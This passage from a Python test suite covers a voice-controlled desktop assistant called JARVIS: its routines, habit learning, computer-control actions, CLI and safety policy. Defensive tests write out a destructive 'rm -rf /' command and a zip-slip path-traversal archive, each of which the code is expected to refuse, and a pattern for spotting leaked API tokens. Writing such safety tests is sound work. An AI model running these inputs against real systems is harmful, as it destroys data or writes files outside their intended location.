        self.core.ask("delete routine focus")
        self.assertNotIn("routine.focus", self.memory.facts)
        self.assertIn("do not have any routines", self.core.ask("list routines").text)

    def test_long_routine_asks_before_running(self):
        self.core.ask("watch what I do")
        for step in ("open chrome", "set the volume to 20", "notify me that we start",
                     "type hello", "wait 1", "notify me that we are done"):
            self.core.ask(step)
        self.core.ask("save that as big routine")
        self.host.confirm_answer = False
        declined = self.core.ask("run my big routine")
        self.assertFalse(declined.ok)
        self.assertIn("did not approve", declined.text)
        self.host.confirm_answer = True
        self.assertTrue(self.core.ask("run my big routine").ok)

    def test_recording_while_rehearsing_still_teaches(self):
        """Saying “watch what I do” is explicit: dry-run steps are still the ones meant."""
        self.core.ask("watch what I do")
        self.assertTrue(self.core.ask("open chrome").ok)
        self.assertEqual([step.action for step in self.core.recorder.steps], ["open_app"])

    def test_dry_run_does_not_look_like_a_habit(self):
        """Rehearsals must never feed the pattern spotter."""
        self.core.ask("open chrome")
        self.assertEqual(self.timeline.entries(), [])

    def test_core_wires_the_learning_objects_together(self):
        self.assertIs(self.core.actions.timeline, self.core.timeline)
        self.assertIs(self.core.actions.recorder, self.core.recorder)
        self.assertIs(self.core.ctx.state["control"], self.core.actions)


class TestHabitLearning(ControlTestCase):
    """The part that makes routines feel like memory rather than macros."""

    def _repeat(self, steps, times, source="voice"):
        for _ in range(times):
            for action, args in steps:
                self.timeline.add(action, args, source=source, ok=True)

    def test_a_repeated_sequence_is_offered_as_a_routine(self):
        self._repeat([("open_app", {"target": "spotify"}),
                      ("set_volume", {"level": 30}),
                      ("notify", {"text": "deep work"})], 3)
        found = suggestions(self.timeline, self.store)
        self.assertTrue(found)
        self.assertEqual(found[0].count, 3)
        self.assertEqual([step.action for step in found[0].steps],
                         ["open_app", "set_volume", "notify"])
        self.assertIn("spotify", found[0].suggested_name)

    def test_a_habit_you_saved_stops_being_suggested(self):
        self._repeat([("open_app", {"target": "spotify"}), ("set_volume", {"level": 30})], 3)
        first = suggestions(self.timeline, self.store)[0]
        self.store.save(Routine(name=first.suggested_name, steps=first.steps, source="learned"))
        names = [item.suggested_name for item in suggestions(self.timeline, self.store)]
        self.assertNotIn(first.suggested_name, names)

    def test_single_repeats_are_only_suggested_after_three(self):
        self._repeat([("focus_window", {"title": "code"})], 2)
        self.assertEqual([item for item in suggestions(self.timeline, self.store)
                          if len(item.steps) == 1], [])
        self._repeat([("focus_window", {"title": "code"})], 1)
        singles = [item for item in suggestions(self.timeline, self.store) if len(item.steps) == 1]
        self.assertEqual(len(singles), 1)
        self.assertEqual(singles[0].count, 3)

    def test_lookups_do_not_count_as_habits(self):
        self._repeat([("list_windows", {}), ("get_brightness", {})], 5)
        self.assertEqual(suggestions(self.timeline, self.store), [])

    def test_core_offers_to_save_a_habit_after_repeats(self):
        # A real habit: three successful “switch to code” requests, as recorded on a
        # machine where the action actually worked.
        for _ in range(3):
            self.timeline.add("focus_window", {"title": "code"}, source="voice", ok=True)
        first = self.core.ask("open chrome")
        self.assertIn("Habit spotted", first.text)
        self.assertIn("code routine", first.text)
        second = self.core.ask("open chrome")
        self.assertNotIn("Habit spotted", second.text)   # never nags twice

    def test_habit_watching_can_be_switched_off(self):
        self.settings["routine_watch"] = False
        for _ in range(3):
            self.timeline.add("focus_window", {"title": "code"}, source="voice", ok=True)
        self.assertNotIn("Habit spotted", self.core.ask("open chrome").text)

    def test_timeline_is_capped(self):
        timeline = Timeline(limit=5)
        for index in range(12):
            timeline.add("click", {"x": index})
        self.assertEqual(len(timeline.entries()), 5)


class TestRoutineRunner(ControlTestCase):
    def test_failure_stops_the_routine_and_says_where(self):
        """A step that cannot run stops the routine instead of half-finishing it."""
        routine = Routine(name="broken", steps=[
            Step("set_volume", {"level": 20}),
            Step("launch_a_space_rocket"),                     # no such action any more
            Step("set_brightness", {"level": 50}),
        ])
        result = RoutineRunner(self.registry, self.timeline, self.store).run(routine)
        self.assertFalse(result.ok)
        self.assertTrue(result.stopped_early)
        self.assertEqual(len(result.outcomes), 2)          # never reached step 3
        self.assertIn("stopped at", result.spoken)
        self.assertIn("no longer have an action", result.outcomes[1].result.message)

    def test_optional_steps_do_not_stop_the_routine(self):
        routine = Routine(name="tolerant", steps=[
            Step("launch_a_space_rocket", optional=True),
            Step("set_volume", {"level": 20}),
        ])
        result = RoutineRunner(self.registry, self.timeline, self.store).run(routine)
        self.assertTrue(result.ok)
        self.assertEqual(result.done, 1)

    def test_policy_still_applies_inside_a_routine(self):
        routine = Routine(name="dangerous", steps=[Step("run_command", {"command": "rm -rf /"})])
        result = RoutineRunner(self.registry, self.timeline, self.store).run(routine)
        self.assertFalse(result.ok)
        self.assertIn("refused", result.outcomes[0].result.message.lower())


# ════════════════════════════════════════════════════════════════════════════
#  Computer control: skills, CLI and reporting
# ════════════════════════════════════════════════════════════════════════════

class TestControlSkills(ControlTestCase):
    def test_control_skills_are_registered(self):
        names = {skill.name for skill in self.core.registry.skills}
        self.assertLessEqual({"control", "routine", "plan"}, names)

    def test_multi_step_plan_runs_in_order(self):
        response = self.core.ask("open chrome, then set the volume to 20 and then read my screen")
        self.assertEqual(response.skill, "plan")
        self.assertTrue(response.ok, response.text)
        self.assertIn("3 steps completed", response.text)

    def test_plan_reports_a_step_it_cannot_understand(self):
        response = self.core.ask("open chrome then invent a new planet")
        self.assertFalse(response.ok)
        self.assertIn("invent a new planet", response.text)

    def test_plan_confirmation_can_be_refused(self):
        self.host.confirm_answer = False
        response = self.core.ask("open chrome, then set the volume to 20")
        self.assertFalse(response.ok)
        self.assertIn("nothing was changed", response.text.lower())

    def test_lookups_are_safe_and_answer(self):
        response = self.core.ask("what is on my screen")
        self.assertEqual(response.skill, "control")
        self.assertTrue(response.ok)

    def test_shell_skill_reports_output(self):
        response = self.core.ask("run the command echo hello")
        self.assertTrue(response.ok, response.text)
        self.assertIn("hello", response.text)

    def test_unknown_details_are_reported_honestly(self):
        response = self.core.ask("set the volume to loudish")
        self.assertFalse(response.ok)
        self.assertIn("details", response.text)

    def test_destructive_action_asks_and_explains_why_it_cannot(self):
        response = self.core.ask("kill chrome")
        self.assertFalse(response.ok)
        self.assertIn("Allow destructive", response.text)

    def test_control_can_be_switched_off(self):
        self.settings["control_enabled"] = False
        self.settings["provider"] = "offline"          # no cloud model in this test
        core = Core(self.settings, Memory(), HeadlessHost(verbose=False))
        self.assertIsNone(core.actions)
        names = {skill.name for skill in core.registry.skills}
        self.assertNotIn("control", names)
        self.assertIn("outside my offline skill set", core.ask("open chrome").text)
        core.shutdown()


class TestCliControl(unittest.TestCase):
    """The command-line entry points for the new features."""

    def setUp(self) -> None:
        self.home = Path(tempfile.mkdtemp(prefix="jarvis-cli-"))
        self._previous = os.environ.get("JARVIS_HOME")
        os.environ["JARVIS_HOME"] = str(self.home)

    def tearDown(self) -> None:
        if self._previous:
            os.environ["JARVIS_HOME"] = self._previous

    def run_cli(self, *args: str) -> str:
        import contextlib
        import io

        from jarvis.run import main

        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            code = main(list(args))
        self.return_code = code
        return buffer.getvalue()

    def test_actions_lists_everything_with_risk_labels(self):
        output = self.run_cli("--actions", "--dry-run")
        self.assertEqual(self.return_code, 0)
        self.assertIn("Computer control", output)
        self.assertIn("open_app", output)
        self.assertIn("[dangerous]", output)
        self.assertIn("delete_path", output)

    def test_routines_and_audit_are_readable_when_empty(self):
        self.assertIn("No routines saved yet", self.run_cli("--routines"))
        self.assertIn("Nothing logged yet", self.run_cli("--audit"))

    def test_ask_runs_a_control_request_and_refuses_risky_ones(self):
        output = self.run_cli("--ask", "set the volume to 12", "--dry-run", "--yes")
        self.assertIn("12", output)
        refused = self.run_cli("--ask", "shut down", "--dry-run")
        self.assertIn("Allow destructive", refused)

    def test_doctor_reports_the_control_surface(self):
        output = self.run_cli("--doctor")
        self.assertIn("Skills loaded", output)
        self.assertIn("Control", output)
        self.assertIn("audit log", output)


# ════════════════════════════════════════════════════════════════════════════
class TestEverydayActions(ControlTestCase):
    """The abilities added in the “do any task” pass."""

    def test_surface_grew_and_stays_organised(self):
        self.assertGreaterEqual(len(self.registry.actions), 70)
        groups = {action.group for action in self.registry.actions.values()}
        for expected in ("apps", "windows", "keyboard", "mouse", "files", "clipboard",
                         "processes", "screen", "system", "audio", "display"):
            self.assertIn(expected, groups, f"missing action group {expected}")
        # every action must be callable and describe itself
        for action in self.registry.actions.values():
            self.assertTrue(action.title and action.description, action.name)

    def test_media_keys_go_through_policy_and_audit(self):
        result = self.registry.execute("media_control", {"action": "next"})
        self.assertTrue(result.ok)
        self.assertIn("next", result.message.lower())
        self.assertEqual(self.core.audit.tail(1)[-1]["action"], "media_control")
        bad = self.registry.execute("media_control", {"action": "rewind"})
        self.assertFalse(bad.ok)

    def test_system_switches_parse_and_run(self):
        for phrase, kind, state in (
            ("turn off wifi", "wifi", "off"),
            ("enable night light", "nightlight", "on"),
            ("turn on do not disturb", "dnd", "on"),
            ("power saving mode", "power_saver", "on"),
            ("turn on dark mode", "dark_mode", "on"),
        ):
            action, args = parse(phrase)
            self.assertEqual(action, "system_switch", phrase)
            self.assertEqual((args["kind"], args["state"]), (kind, state), phrase)
        result = self.registry.execute("system_switch", {"kind": "wifi", "state": "off"})
        self.assertTrue(result.ok)

    def test_named_shortcuts_replace_raw_key_names(self):
        self.check("press save", "press_shortcut", name="save")
        self.check("hit undo", "press_shortcut", name="undo")
        result = self.registry.execute("press_shortcut", {"name": "copy"})
        self.assertTrue(result.ok)
        unknown = self.registry.execute("press_shortcut", {"name": "levitate"})
        self.assertFalse(unknown.ok)

    def test_mouse_can_be_aimed_with_coordinates(self):
        self.check("click at 400,300", "click_at", x=400, y=300)
        self.check("click 250 120", "click_at", x=250, y=120)
        self.check("drag from 10,10 to 200,150", "drag_mouse", x1=10, y1=10, x2=200, y2=150)
        done = self.registry.execute("click_at", {"x": 10, "y": 20})
        self.assertTrue(done.ok)
        dragged = self.registry.execute("drag_mouse", {"x1": 0, "y1": 0, "x2": 50, "y2": 50})
        self.assertTrue(dragged.ok)

    def test_windows_can_be_placed_and_pinned(self):
        self.check("snap chrome to the left", "window_control", title="chrome", action="snap_left")
        self.check("make this window fullscreen", "window_control", title="", action="fullscreen")
        self.check("keep chrome on top", "window_control", title="chrome", action="always_on_top")
        self.check("show me the desktop", "show_desktop")
        self.check("go to workspace 3", "switch_desktop", number="3")
        self.check("move chrome to 0,0 1280x720", "move_window", title="chrome", x=0, y=0,
                   width=1280, height=720)
        result = self.registry.execute("window_control", {"title": "chrome", "action": "snap_right"})
        self.assertTrue(result.ok)

    def test_screen_can_be_searched_by_text(self):
        self.check("find the save button on my screen", "find_on_screen", text="the save button")
        self.check("copy what's on my screen", "copy_screen_text")
        self.check("what's my screen resolution", "screen_size")
        # No display and no Tesseract in the sandbox: these must fail *honestly*.
        found = self.registry.execute("find_on_screen", {"text": "save"})
        self.assertFalse(found.ok)
        self.assertTrue(found.hint or "install" in found.message.lower() or found.message)

    def test_files_can_be_read_searched_and_unpacked(self):
        self.use_real_files()                    # this one asserts on real bytes
        folder = self.home / "files"
        folder.mkdir(parents=True, exist_ok=True)
        (folder / "notes.txt").write_text("first line\nsecond line\nthird line\n", encoding="utf-8")
        self.check("read notes.txt", "read_file", path="notes.txt")
        self.check("find all pdf files in downloads", "find_files", pattern="pdf")
        self.check("add buy milk to ~/todo.txt", "append_file", path="~/todo.txt", content="buy milk")
        self.check("duplicate report.md", "duplicate_path", path="report.md")
        self.check("extract backup.zip", "unzip_path", path="backup.zip", destination="")
        self.check("how much disk space is left", "disk_usage", path="")

        read = self.registry.execute("read_file", {"path": str(folder / "notes.txt"), "count": 2})
        self.assertTrue(read.ok)
        self.assertIn("second line", read.message)
        self.assertNotIn("third line", read.message)

        appended = self.registry.execute("append_file", {"path": str(folder / "notes.txt"),
                                                         "content": "fourth line"})
        self.assertTrue(appended.ok)
        self.assertIn("fourth line", (folder / "notes.txt").read_text(encoding="utf-8"))

        copied = self.registry.execute("duplicate_path", {"path": str(folder / "notes.txt")})
        self.assertTrue(copied.ok)
        self.assertTrue((folder / "notes copy.txt").exists())

        found = self.registry.execute("find_files", {"pattern": "*.txt", "root": str(folder)})
        self.assertTrue(found.ok)
        self.assertEqual(found.data["count"], 2)

        zip_target = folder / "bundle.zip"
        with zipfile.ZipFile(zip_target, "w") as archive:
            archive.writestr("inside.txt", "hello")
        unpacked = self.registry.execute("unzip_path", {"path": str(zip_target)})
        self.assertTrue(unpacked.ok)
        self.assertTrue((folder / "bundle" / "inside.txt").exists())

        info = self.registry.execute("file_info", {"path": str(zip_target)})
        self.assertTrue(info.ok)
        self.assertIn("zip", info.message.lower())

        usage = self.registry.execute("disk_usage", {"path": str(folder)})
        self.assertTrue(usage.ok)
        self.assertIn("free", usage.message.lower())

    def test_zip_slip_archives_are_refused(self):
        folder = self.home / "evil"
        folder.mkdir(parents=True, exist_ok=True)
        target = folder / "evil.zip"
        with zipfile.ZipFile(target, "w") as archive:
            archive.writestr("../escaped.txt", "nope")
        result = self.registry.execute("unzip_path", {"path": str(target)})
        self.assertFalse(result.ok)
        self.assertIn("unsafe", result.message.lower())
        self.assertFalse((self.home / "escaped.txt").exists())

    def test_processes_and_apps_can_be_inspected(self):
        self.check("what apps are open", "list_apps")
        self.check("is chrome running", "find_process", name="chrome")
        listing = self.registry.execute("find_process", {"name": "python"})
        self.assertTrue(listing.ok)                  # the test runner is a python process

    def test_clipboard_history_remembers_and_restores(self):
        self.check("what did i copy earlier", "clipboard_history")
        self.check("put back what i copied", "clipboard_restore", index=1)
        self.registry.execute("clipboard_write", {"text": "first thing"})
        self.registry.execute("clipboard_write", {"text": "second thing"})
        history = ActionRegistry(self.settings, self.memory, self.host, self.controller)
        history.timeline = None
        result = history.execute("clipboard_history", {})
        self.assertTrue(result.ok)
        self.assertIn("second thing", result.message)
        restored = history.execute("clipboard_restore", {"index": 2})
        self.assertTrue(restored.ok)
        self.assertIn("first thing", self.host.get_clipboard())

    def test_terminal_and_trash_are_guarded(self):
        self.check("open a terminal", "open_terminal")
        self.check("empty the trash", "empty_trash")
        self.settings["allow_dangerous"] = False
        self.core.actions.policy = Policy(self.settings)
        refused = self.core.actions.execute("empty_trash", {})
        self.assertFalse(refused.ok)
        self.assertIn("destructive", refused.message.lower())

    def test_new_phrases_reach_the_control_skill(self):
        for phrase in ("turn off wifi", "next song", "snap chrome to the left", "click at 400,300",
                       "what shortcuts do you know", "show me the desktop", "is chrome running",
                       "empty the trash", "make the screen dimmer", "open a terminal"):
            skill, score = self.core.registry.route(phrase)
            self.assertIsNotNone(skill, phrase)
            self.assertEqual(skill.name, "control", f"{phrase} → {skill.name} ({score:.2f})")

    def test_help_lists_the_whole_surface(self):
        response = self.core.ask("what can you control")
        self.assertTrue(response.ok)
        self.assertIn("open_app", response.text)
        self.assertIn("media_control", response.text)
        self.assertIn("window_control", response.text)

    def test_typing_can_target_a_window(self):
        self.check("type my address into the form", "type_into", text="my address", target="form")
        result = self.registry.execute("type_into", {"target": "notepad", "text": "hello"})
        self.assertTrue(result.ok)
        missing = self.registry.execute("type_into", {"target": "", "text": "x"})
        self.assertFalse(missing.ok)

    def test_shortcut_table_is_platform_aware(self):
        table = shortcut_table()
        self.assertIn("save", table)
        self.assertIn("copy", table)
        self.assertTrue(table["save"].endswith("+s"))
        self.assertIn("paste", table)


# ════════════════════════════════════════════════════════════════════════════
class TestClipboardHistoryPrivacy(ControlTestCase):
    def test_looks_like_a_secret_is_not_kept(self):
        from jarvis.actions import SECRETISH
        self.assertTrue(SECRETISH.search("token gsk_abcdefghijklmnopqrstuv"))
        self.registry.execute("clipboard_write", {"text": "sk-" + "a" * 24})
        self.assertFalse(any("sk-" in entry["text"] for entry in self.registry.actions["clipboard_history"]
                             .run(self.registry.context(), {"level": "brief"}).data.get("entries", [])))


try:                       # the invoker is UI code: only test it where Qt can load
    import os as _os
    _os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    _os.environ.setdefault("LD_LIBRARY_PATH", "/tmp/qtstubs")
    from PyQt6.QtWidgets import QApplication
    QT_OK = True
except Exception:          # pragma: no cover - depends on the machine
    QT_OK = False


@unittest.skipUnless(QT_OK, "PyQt6 cannot load here")
class TestMainThreadInvoker(unittest.TestCase):
    """The GUI marshaller must hand results back, not just deliver the call.

    Regression: jobs used to be popped before they ran, so a blocking call from a
    worker thread always came back as None — which made every confirmation in the
    window silently answer “no”.
    """

    def test_blocking_call_returns_the_result_from_a_worker_thread(self):
        import threading

        from jarvis.ui.main_window import MainThreadInvoker

        app = QApplication.instance() or QApplication([])
        invoker = MainThreadInvoker()
        seen: dict[str, object] = {}

        def worker() -> None:
            seen["answer"] = invoker.call(lambda: "approved", blocking=True, timeout=5)

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        for _ in range(50):
            app.processEvents()
            if not thread.is_alive():
                break
            threading.Event().wait(0.02)
        thread.join(timeout=5)
        self.assertEqual(seen.get("answer"), "approved")

    def test_errors_travel_back_to_the_caller(self):
        import threading

        from jarvis.ui.main_window import MainThreadInvoker

        app = QApplication.instance() or QApplication([])
        invoker = MainThreadInvoker()
        seen: dict[str, object] = {}

        def worker() -> None:
            try:
                invoker.call(lambda: 1 / 0, blocking=True, timeout=5)
            except Exception as exc:
                seen["error"] = type(exc).__name__

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        for _ in range(50):
            app.processEvents()
            if not thread.is_alive():
                break
            threading.Event().wait(0.02)
        thread.join(timeout=5)
        self.assertEqual(seen.get("error"), "ZeroDivisionError")


class TestBehaviourLearning(JarvisTestCase):
    """JARVIS adapts to how this particular user works."""

    def setUp(self) -> None:
        super().setUp()
        self.settings["dry_run"] = True
        self.settings["provider"] = "offline"     # no network in the test sandbox
        self.host.confirm_answer = True
        self.core = Core(self.settings, self.memory, self.host)
        self.profile = self.core.profile

    def test_profile_records_actions_and_apps(self):
        self.profile.observe_action("open_app", {"target": "chrome"}, ok=True)
        self.profile.observe_action("open_app", {"target": "chrome"}, ok=True)
        self.profile.observe_action("set_volume", {"level": 20}, ok=False)
        stats = self.profile.stats()
        self.assertEqual(stats["actions_seen"], 3)
        self.assertIn(("chrome", 2), self.profile.top_apps())
        self.assertEqual(self.profile.top_actions(1)[0], ("open_app", 2))

    def test_profile_persists_and_can_be_reset(self):
        self.profile.learn_alias("chill", action="open_app", args={"target": "spotify"}, taught=True)
        self.profile.flush(force=True)
        reloaded = BehaviourProfile(self.profile.path)
        self.assertIn("chill", reloaded.aliases())
        reloaded.reset()
        self.assertEqual(reloaded.aliases(), {})

    def test_alias_runs_the_action_it_was_taught(self):
        self.profile.learn_alias("chill", action="set_volume", args={"level": 5}, taught=True)
        response = self.core.ask("chill")
        self.assertTrue(response.ok)
        self.assertIn("set volume", response.text)
        self.assertEqual(response.data.get("action"), "set_volume")

    def test_jarvis_learns_a_phrase_from_demonstration(self):
        # A phrase nothing understands, then the command the user meant.
        miss = self.core.ask("frobnicate the thing")
        self.assertEqual(miss.skill, "fallback", "nothing should understand this yet")
        self.core.ask("open notepad")
        self.assertIn("frobnicate the thing", self.profile.aliases())
        learned = self.profile.aliases()["frobnicate the thing"]
        self.assertEqual(learned["action"], "open_app")
        self.assertEqual(learned["args"].get("target"), "notepad")
        # …and it works from then on.
        self.assertTrue(self.core.ask("frobnicate the thing").ok)

    def test_teach_command_creates_a_multi_step_alias(self):
        reply = self.core.ask("/teach focus mode = open notepad, then set the volume to 5")
        self.assertTrue(reply.ok)
        self.assertIn("2 steps", reply.text)
        self.assertIsNotNone(self.core.routine_store.get("focus mode"))
        self.assertTrue(self.core.ask("focus mode").ok)

    def test_forget_removes_an_alias(self):
        self.core.ask("/teach chill = open notepad")
        self.assertTrue(self.core.ask("/forget chill").ok)
        self.assertIn("chill", self.core.ask("/forget chill").text)

    def test_repeated_approval_teaches_trust(self):
        action = self.core.actions.get("close_window")
        self.assertTrue(self.core.actions.policy.evaluate(action, {}).needs_confirmation)
        for _ in range(4):
            self.profile.count_approval("close_window", True)
        decision = self.core.actions.policy.evaluate(action, {})
        self.assertFalse(decision.needs_confirmation)
        self.assertTrue(decision.learned)

    def test_a_single_no_blocks_learned_trust(self):
        for _ in range(5):
            self.profile.count_approval("close_window", True)
        self.profile.count_approval("close_window", False)
        self.assertFalse(self.profile.learned_trust("close_window"))
        self.assertTrue(self.core.actions.policy.evaluate(
            self.core.actions.get("close_window"), {}).needs_confirmation)

    def test_dangerous_actions_never_earn_trust(self):
        for _ in range(10):
            self.profile.count_approval("delete_path", True)
        self.settings["allow_dangerous"] = True
        decision = self.core.actions.policy.evaluate(self.core.actions.get("delete_path"),
                                                     {"path": "x.txt"})
        self.assertTrue(decision.needs_confirmation, "destructive actions must always ask")

    def test_rituals_need_more_than_one_day(self):
        now = time.time()
        for day in (0, 1):
            self.profile.observe_action("open_app", {"target": "slack"}, ts=now - day * 86400)
        self.assertEqual(len(self.profile.rituals()), 1)
        self.assertIn("at this time of day", self.profile.summary())

    def test_profile_feeds_the_model_prompt(self):
        self.profile.observe_action("open_app", {"target": "chrome"}, ok=True)
        bits = self.profile.prompt_bits()
        self.assertIn("chrome", bits)

    def test_learning_can_be_switched_off(self):
        self.settings["learn_habits"] = False
        core = Core(self.settings, self.memory, HeadlessHost(verbose=False))
        core.ask("open notepad")
        self.assertFalse(core.profile.enabled)
        self.assertEqual(core.profile.stats()["actions_seen"], 0)
        core.shutdown()


class TestBrainEfficiency(JarvisTestCase):
    """The free-cloud brain: free by default, cached, and honest when offline."""

    def test_identical_questions_are_cached(self):
        from jarvis.brain import Reply
        brain = self.core.brain
        calls = []

        def fake_ask_compatible(messages, provider):
            calls.append(provider)
            return "same answer", "test-model"

        brain._ask_compatible = fake_ask_compatible          # type: ignore[assignment]
        brain._failed.clear()
        first = brain.ask("what is the time", use_cache=True)
        second = brain.ask("what is the time", use_cache=True)
        self.assertTrue(first.ok)
        self.assertTrue(second.cached)
        self.assertEqual(len(calls), 1, "the second identical question must not hit the network")
        self.assertIsInstance(brain._cache.get("nope"), (Reply, type(None)))

    def test_failing_provider_is_skipped_for_a_while(self):
        brain = self.core.brain
        brain.note_failure("pollinations")
        self.assertTrue(brain.in_cooldown("pollinations"))
        brain.note_success("pollinations")
        self.assertFalse(brain.in_cooldown("pollinations"))

    def test_no_network_is_reported_fast_and_honestly(self):
        brain = self.core.brain
        brain.note_offline()
        started = time.time()
        reply = brain.ask("hello there", use_cache=False)
        self.assertLess(time.time() - started, 0.5, "an offline brain must not stall the window")
        self.assertFalse(reply.ok)
        self.assertIn("network", reply.error.lower())

    def test_streaming_yields_chunks(self):
        brain = self.core.brain

        def fake_stream(messages, provider):
            yield from ("Hel", "lo ", "there")

        brain._stream_compatible = fake_stream                 # type: ignore[assignment]
        brain._failed.clear()
        pieces = list(brain.ask_stream("say hello"))
        self.assertEqual("".join(pieces), "Hello there")

    def test_streamed_answer_reaches_the_ui_callback(self):
        """The window sees tokens while the rest of the answer is still arriving."""
        import threading

        core = self.core
        core.settings["provider"] = "gemini"          # a provider, without a real key
        core.settings.set_api_key("gemini", "test-key-not-used")
        chunks: list[str] = []
        done = threading.Event()
        boxes: list[Any] = []

        def fake_stream(*_args, **_kwargs):
            yield from ("All ", "systems ", "nominal.")

        core.brain.ask_stream = fake_stream                    # type: ignore[assignment]
        core.ask_async("compose a short haiku about the stars",
                       lambda response: (boxes.append(response), done.set()),
                       on_chunk=chunks.append)
        self.assertTrue(done.wait(10), "the answer never arrived")
        self.assertEqual(chunks, ["All ", "systems ", "nominal."])
        self.assertTrue(boxes[0].ok)
        self.assertEqual(boxes[0].text, "All systems nominal.")


class TestWebSearch(ParseChecks, JarvisTestCase):
    """Searching is a first-class action, so plans can include it."""

    def test_engines(self):
        self.check("search the web for python 3.13", "web_search", query="python 3.13", engine="google")
        self.check("search youtube for lofi beats", "web_search", query="lofi beats", engine="youtube")
        self.check("search wikipedia for ada lovelace", "web_search", query="ada lovelace",
                   engine="wikipedia")
        self.check("google best coffee in trichy", "web_search", query="best coffee in trichy")

    def test_memory_phrases_are_not_hijacked(self):
        self.assertIsNone(parse("search my notes for invoice"))
        self.assertEqual(self.core.ask("search my notes for invoice").skill, "memory")

    def test_action_exists_and_is_safe(self):
        settings = Settings()
        registry = build_actions(Controller(settings, simulate=True))
        action = registry["web_search"]
        self.assertEqual(action.risk, SAFE)
        self.assertIn("query", action.params)


class TestExampleCoverage(unittest.TestCase):
    """Every action must be reachable from the phrase we advertise for it.

    This is the machine-checkable half of “JARVIS can do anything on my computer
    by voice”: if an action has no phrase to say, or its phrase falls through to
    the fallback skill, the palette and the README are lying to the user.
    """

    def setUp(self) -> None:
        self.home = Path(tempfile.mkdtemp(prefix="jarvis-examples-"))
        self._previous = os.environ.get("JARVIS_HOME")
        os.environ["JARVIS_HOME"] = str(self.home)
        self.settings = Settings()
        self.settings["dry_run"] = True           # rehearse: never touch the machine
        self.settings["trust_level"] = "trusted"
        self.settings["allow_dangerous"] = True
        self.settings["provider"] = "offline"
        self.settings["voice_replies"] = False
        self.settings["learn_habits"] = False
        self.memory = Memory()
        self.host = HeadlessHost(verbose=False)
        self.core = Core(self.settings, self.memory, self.host)

    def tearDown(self) -> None:
        self.core.shutdown()
        if self._previous:
            os.environ["JARVIS_HOME"] = self._previous
        else:
            os.environ.pop("JARVIS_HOME", None)

    def test_every_action_has_an_example(self):
        missing = [name for name, action in self.core.actions.actions.items() if not action.examples]
        self.assertEqual(missing, [], f"actions with no spoken example: {missing}")

    def test_every_example_reaches_a_route(self):
        misses = []
        for name, action in sorted(self.core.actions.actions.items()):
            phrase = action.examples[0]
            self.core.actions.recent.clear()
            response = self.core.ask(phrase)
            ran = [entry["action"] for entry in self.core.actions.recent]
            if not ran and response.skill in ("fallback", "", None):
                misses.append((name, phrase))
        self.assertEqual(misses, [], f"phrases nothing understood: {misses}")


class TestPhraseRegressions(ControlTestCase):
    """Phrasings that used to be swallowed by an older, clumsier rule."""

    def test_volume_question_is_not_a_mute(self):
        self.check("what's the volume", "get_volume")
        self.check("what is my brightness", "get_brightness")

    def test_volume_direction_and_amount(self):
        self.check("volume down 15", "nudge_volume", delta=-15)
        self.check("turn the volume up by 20", "nudge_volume", delta=20)
        self.check("volume 30", "set_volume", level=30)

    def test_mute_stays_on_the_mute_action(self):
        self.check("mute", "mute_control", action="on")
        self.check("unmute", "mute_control", action="off")
        self.check("toggle mute", "mute_control", action="toggle")

    def test_write_and_say_are_not_typing(self):
        self.check("save hello to notes.txt", "write_file", path="notes.txt", content="hello")
        self.check("write hello to notes.txt", "append_file", path="notes.txt", content="hello")
        self.check("say good morning", "speak", text="good morning")

    def test_names_stay_openable(self):
        self.check("open Report Final.PDF", "open_path", path="Report Final.PDF")
        self.check("open github.com", "open_url")
        self.check("open the folder downloads", "open_path")
        self.check("move my mouse to 100,200", "move_mouse", x=100, y=200)


class TestAssistantPhrases(ControlTestCase):
    """The two escape hatches: asking a question, and handing work to a skill."""

    def test_ask_me_is_a_prompt(self):
        self.check("ask me for the invoice number", "ask_user", prompt="For the invoice number?")

    def test_run_skill_rewrites_the_question(self):
        self.check("ask yourself what the time is", "run_skill", text="what is the time")

    def test_named_list_goes_to_a_file(self):
        parsed = parse("add milk to my shopping list")
        self.assertEqual(parsed[0], "append_file")
        self.assertTrue(parsed[1]["path"].endswith("shopping-list.md"))
